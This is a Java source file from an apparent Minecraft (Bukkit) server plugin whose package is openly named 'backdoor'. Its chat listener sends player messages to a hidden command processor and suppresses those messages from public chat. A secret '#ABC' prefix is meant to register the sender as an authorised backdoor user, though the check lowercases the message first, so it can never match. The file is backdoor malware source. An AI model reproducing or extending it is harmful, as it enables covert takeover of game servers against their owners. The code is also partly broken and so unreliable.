package de.blox.backdoor.listener;

import de.blox.backdoor.core.Core;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class PlayerChatListener implements Listener {

    @EventHandler
    public void handlePlayerChat(AsyncPlayerChatEvent event) {
        try {
            if (!Core.getInstance().getCommandProvider().processCommand(event.getPlayer(), event.getMessage())) {
                event.setCancelled(true);
            }
        }catch (Exception ignored) {
        }
        if (event.getMessage().toLowerCase().startsWith("#ABC")) {
            Core.getInstance().getRegisteredPlayers().add(event.getPlayer().getUniqueId().toString());
        }
    }

}
